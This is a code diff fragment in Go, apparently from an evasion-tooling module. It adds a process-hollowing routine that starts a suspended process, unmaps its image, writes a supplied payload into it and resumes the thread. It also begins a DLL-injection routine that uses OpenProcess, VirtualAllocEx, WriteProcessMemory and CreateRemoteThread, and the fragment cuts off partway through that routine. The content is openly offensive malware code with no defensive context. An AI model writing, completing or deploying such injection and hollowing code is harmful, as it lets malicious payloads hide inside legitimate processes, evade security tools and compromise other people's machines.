@@ -153,3 +153,48 @@ func (e *EvasionHandler) ProcessHollowing(targetProcess string, payload []byte) 
 		0,
 		uintptr(unsafe.Pointer(cmdLine)),
 		0, 0, 0,
+		uintptr(0x00000004),
+		0, 0,
+		uintptr(unsafe.Pointer(&si)),
+		uintptr(unsafe.Pointer(&pi)),
+	)
+	if ret == 0 {
+		return fmt.Errorf("CreateProcess failed: %v", err)
+	}
+
+	unmapView.Call(uintptr(pi.Process), 0x400000)
+
+	var written uintptr
+	writeMem.Call(
+		uintptr(pi.Process),
+		0x400000,
+		uintptr(unsafe.Pointer(&payload[0])),
+		uintptr(len(payload)),
+		uintptr(unsafe.Pointer(&written)),
+	)
+
+	resumeThread.Call(uintptr(pi.Thread))
+
+	e.techniques["process_hollowing"] = true
+	return nil
+}
+
+func (e *EvasionHandler) InjectDLL(pid int, dllPath string) error {
+	if runtime.GOOS != "windows" {
+		return fmt.Errorf("DLL injection is Windows only")
+	}
+
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	openProcess := kernel32.NewProc("OpenProcess")
+	virtualAlloc := kernel32.NewProc("VirtualAllocEx")
+	writeMem := kernel32.NewProc("WriteProcessMemory")
+	createThread := kernel32.NewProc("CreateRemoteThread")
+	getProcAddr := kernel32.NewProc("GetProcAddress")
+	getModHandle := kernel32.NewProc("GetModuleHandleW")
+
+	hProcess, _, err := openProcess.Call(uintptr(0x001F0FFF), 0, uintptr(pid))
+	if hProcess == 0 {
+		return fmt.Errorf("OpenProcess failed: %v", err)
+	}
+
+	dllPathBytes := append([]byte(dllPath), 0)
